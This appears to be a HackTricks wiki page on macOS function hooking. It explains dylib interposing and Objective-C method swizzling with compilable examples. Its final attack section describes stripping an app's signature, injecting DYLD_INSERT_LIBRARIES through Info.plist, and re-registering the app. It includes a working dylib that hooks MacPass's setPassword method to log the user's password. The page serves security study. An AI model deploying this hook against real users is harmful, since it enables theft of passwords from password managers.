# macOS Function Hooking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Function Interposing

Create a **dylib** with an **`__interpose` (`__DATA___interpose`)** section (or a section flagged with **`S_INTERPOSING`**) containing tuples of **function pointers** that refer to the **original** and the **replacement** functions.

Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (the interposing needs occur before the main app loads). Obviously the [**restrictions** applied to the use of **`DYLD_INSERT_LIBRARIES`** applies here also](macos-library-injection/#check-restrictions).

### Interpose printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" overflow="wrap" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
    //va_list args;
    //va_start(args, format);
    //int ret = vprintf(format, args);
    //va_end(args);

    int ret = printf("Hello from interpose\n");
    return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
    printf("Hello World!\n");
    return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
{% code overflow="wrap" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
    __attribute__((used)) static struct { \
        const void* replacement; \
        const void* replacee; \
    } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
        (const void*) (unsigned long) &_replacement, \
        (const void*) (unsigned long) &_replacee \
    };

int my_printf(const char *format, ...)
{
    int ret = printf("Hello from interpose\n");
    return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endcode %}
{% endtab %}
{% endtabs %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```

{% hint style="warning" %}
The **`DYLD_PRINT_INTERPOSTING`** env variable can be used to debug interposing and will print the interpose process.
{% endhint %}

Also note that **interposing occurs between the process and the loaded libraries**, it doesn't work with the shared library cache.

### Dynamic Interposing

Now it's also possible to interpose a function dynamically using the function **`dyld_dynamic_interpose`**. This allows to programatically interpose a function in run time instead of doing it only from the begining.

It's just needed to indicate the **tuples** of the **function to replace and the replacement** function.

```c
struct dyld_interpose_tuple {
    const void* replacement;
    const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
        const struct dyld_interpose_tuple array[], size_t count);
```

## Method Swizzling

In ObjectiveC this is how a method is called like: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

It's needed the **object**, the **method** and the **params**. And when a method is called a **msg is sent** using the function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

The object is **`someObject`**, the method is **`@selector(method1p1:p2:)`** and the arguments are **value1**, **value2**.

Following the object structures, it's possible to reach an **array of methods** where the **names** and **pointers** to the method code are **located**.

{% hint style="danger" %}
Note that because methods and classes are accessed based on their names, this information is store in the binary, so it's possible to retrieve it with `otool -ov </path/bin>` or [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Accessing the raw methods

It's possible to access the information of the methods such as name, number of params or address like in the following example:

{% code overflow="wrap" %}
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
    // Get class of the variable
    NSString* str = @"This is an example";
    Class strClass = [str class];
    NSLog(@"str's Class name: %s", class_getName(strClass));

    // Get parent class of a class
    Class strSuper = class_getSuperclass(strClass); 
    NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

    // Get information about a method
    SEL sel = @selector(length);
    NSLog(@"Selector name: %@", NSStringFromSelector(sel));
    Method m = class_getInstanceMethod(strClass,sel);
    NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
    NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

    // Iterate through the class hierarchy
    NSLog(@"Listing methods:");
    Class currentClass = strClass;
    while (currentClass != NULL) {
        unsigned int inheritedMethodCount = 0;
        Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);
        
        NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);
        
        for (unsigned int i = 0; i < inheritedMethodCount; i++) {
            Method method = inheritedMethods[i];
            SEL selector = method_getName(method);
            const char* methodName = sel_getName(selector);
            unsigned long address = (unsigned long)method_getImplementation(m);
            NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
        }
        
        // Free the memory allocated by class_copyMethodList
        free(inheritedMethods);
        currentClass = class_getSuperclass(currentClass);
    }

    // Other ways to call uppercaseString method
    if([str respondsToSelector:@selector(uppercaseString)]) {
        NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
        NSLog(@"Uppercase string: %@", uppercaseString);
    }

    // Using objc_msgSend directly
    NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
    NSLog(@"Uppercase string: %@", uppercaseString2);

    // Calling the address directly
    IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
    NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
    NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
    NSLog(@"Uppercase string: %@", uppercaseString3);

    return 0;
}
```
{% endcode %}

### Method Swizzling with method\_exchangeImplementations

The function **`method_exchangeImplementations`** allows to **change** the **address** of the **implementation** of **one function for the other**.

{% hint style="danger" %}
So when a function is called what is **executed is the other one**.
{% endhint %}

{% code overflow="wrap" %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
    NSLog(@"Custom implementation of substringFromIndex:");
    
    // Call the original method
    return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
    // Perform method swizzling
    Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
    Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
    method_exchangeImplementations(originalMethod, swizzledMethod);

    // We changed the address of one method for the other
    // Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
    // And when swizzledSubstringFromIndex is called, substringFromIndex is really colled
    
    // Example usage
    NSString *myString = @"Hello, World!";
    NSString *subString = [myString substringFromIndex:7];
    NSLog(@"Substring: %@", subString);
    
    return 0;
}
```
{% endcode %}

{% hint style="warning" %}
In this case if the **implementation code of the legit** method **verifies** the **method** **name** it could **detect** this swizzling and prevent it from running.

The following technique doesn't have this restriction.
{% endhint %}

### Method Swizzling with method\_setImplementation

The previous format is weird because you are changing the implementation of 2 methods one from the other. Using the function **`method_setImplementation`** you can **change** the **implementation** of a **method for the other one**.

Just remember to **store the address of the implementation of the original one** if you are going to to call it from the new implementation before overwriting it because later it will be much complicated to locate that address.

{% code overflow="wrap" %}
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
    NSLog(@"Custom implementation of substringFromIndex:");
        
    // Call the original implementation using objc_msgSendSuper
    return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Get the class of the target method
        Class stringClass = [NSString class];
        
        // Get the swizzled and original methods
        Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));
        
        // Get the function pointer to the swizzled method's implementation
        IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));
        
        // Swap the implementations
        // It return the now overwritten implementation of the original method to store it
        original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);
        
        // Example usage
        NSString *myString = @"Hello, World!";
        NSString *subString = [myString substringFromIndex:7];
        NSLog(@"Substring: %@", subString);
        
        // Set the original implementation back
        method_setImplementation(originalMethod, original_substringFromIndex);
        
        return 0;
    }
}
```
{% endcode %}

## Hooking Attack Methodology

In this page different ways to hook functions were discussed. However, they involved **running code inside the process to attack**.

In order to do that the easiest technique to use is to inject a [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). However, I guess this could also be done via [Dylib process injection](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

However, both options are **limited** to **unprotected** binaries/processes. Check each technique to learn more about the limitations.

However, a function hooking attack is very specific, an attacker will do this to **steal sensitive information from inside a process** (if not you would just do a process injection attack). And this sensitive information might be located in user downloaded Apps such as MacPass.

So the attacker vector would be to either find a vulnerability or strip the signature of the application, inject the **`DYLD_INSERT_LIBRARIES`** env variable through the Info.plist of the application adding something like:

```xml
<key>LSEnvironment</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key> 
    <string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```

and then **re-register** the application:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Add in that library the hooking code to exfiltrate the information: Passwords, messages...

{% hint style="danger" %}
Note that in newer versions of macOS if you **strip the signature** of the application binary and it was previously executed, macOS **won't be executing the application** anymore.
{% endhint %}

#### Library example

{% code overflow="wrap" %}
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
    // Function that will log the password and call the original setPassword(pass, file_path) method
    NSLog(@"[+] Password is: %@", password);
    
    // After logging the password call the original method so nothing breaks.
    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    // Get the real method address to not lose it
    Class classMPDocument = NSClassFromString(@"MPDocument");
    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
    
    // Make the original method setPassword call the fake implementation one
    IMP fake_IMP = (IMP)custom_setPassword;
    real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
{% endcode %}

## References

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

